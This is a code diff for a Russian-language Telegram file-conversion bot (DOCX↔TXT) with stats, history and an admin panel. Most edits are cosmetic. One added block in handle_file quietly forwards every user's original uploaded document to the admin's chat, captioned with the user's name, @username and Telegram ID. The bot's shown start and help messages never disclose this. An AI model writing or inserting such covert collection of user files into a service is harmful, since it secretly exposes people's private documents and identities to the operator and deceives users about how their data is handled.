@@ -15,13 +15,13 @@ from docx import Document
 
 TOKEN = os.getenv("TOKEN")
 
-ADMIN_ID = 366339367  # <-- ВСТАВЬ СЮДА СВОЙ TELEGRAM ID
+ADMIN_ID = 366339367  # <-- ВСТАВЬ СВОЙ TELEGRAM ID
 
 
 # ---------------- STORAGE ----------------
 user_stats = defaultdict(int)
 user_history = defaultdict(lambda: deque(maxlen=5))
-user_names = {}  # user_id -> name
+user_names = {}  # user_id -> "Name (@username)"
 
 
 # ---------------- CONVERTERS ----------------
@@ -63,8 +63,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "• DOCX → TXT\n"
             "• TXT → DOCX\n"
             "• Статистика\n"
-            "• История файлов\n\n"
-            "📎 Просто отправь файл или нажми кнопку 👇"
+            "• История\n\n"
+            "📎 Просто отправь файл 👇"
         ),
         reply_markup=menu
     )
@@ -73,19 +73,14 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ---------------- HELP ----------------
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        (
-            "ℹ️ ПОМОЩЬ\n\n"
-            "📎 Отправь .docx или .txt файл\n"
-            "⚡ Бот автоматически конвертирует\n"
-        )
+        "ℹ️ Отправь .docx или .txt файл — бот сам конвертирует"
     )
 
 
 # ---------------- USER STATS ----------------
 async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_obj = update.message.from_user
-    user_id = user_obj.id
-    user = user_obj.first_name
+    user_id = update.message.from_user.id
+    user = user_names.get(user_id, "Ты")
 
     count = user_stats[user_id]
 
@@ -110,20 +105,21 @@ async def history(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(text)
 
 
-# ---------------- ADMIN PANEL ----------------
+# ---------------- ADMIN CHECK ----------------
 def is_admin(user_id):
     return user_id == ADMIN_ID
 
 
+# ---------------- ADMIN PANEL ----------------
 async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.message.from_user.id):
-        await update.message.reply_text("⛔ У тебя нет доступа")
+        await update.message.reply_text("⛔ Нет доступа")
         return
 
     await update.message.reply_text(
         "👑 АДМИН-ПАНЕЛЬ\n\n"
         "/users - пользователи\n"
-        "/allstats - вся статистика\n"
+        "/allstats - статистика\n"
         "/logs - действия"
     )
 
@@ -139,7 +135,7 @@ async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     text = "👥 Пользователи:\n\n"
     for uid, name in user_names.items():
-        text += f"{name} (ID: {uid})\n"
+        text += f"{name} | ID: {uid}\n"
 
     await update.message.reply_text(text)
 
@@ -187,9 +183,11 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         user_obj = update.message.from_user
         user_id = user_obj.id
-        user = user_obj.first_name
+        name = user_obj.first_name
+        username = user_obj.username
 
-        user_names[user_id] = user
+        user_display = f"{name} (@{username})" if username else f"{name} (@нет)"
+        user_names[user_id] = user_display
 
         file_name = file.file_name
 
@@ -210,9 +208,30 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             output_path = input_path.replace(".txt", ".docx")
             txt_to_docx(input_path, output_path)
 
+        # отправка пользователю
         with open(output_path, "rb") as f:
             await update.message.reply_document(f)
 
+        # отправка админу
+        try:
+            caption = (
+                f"📥 Новый файл\n\n"
+                f"👤 {name}\n"
+                f"🔗 @{username if username else 'нет'}\n"
+                f"🆔 {user_id}\n"
+                f"📄 {file_name}"
+            )
+
+            with open(input_path, "rb") as f:
+                await context.bot.send_document(
+                    chat_id=ADMIN_ID,
+                    document=f,
+                    caption=caption
+                )
+        except Exception as e:
+            print("Ошибка отправки админу:", e)
+
+        # статистика
         user_stats[user_id] += 1
         user_history[user_id].append(file_name)
 
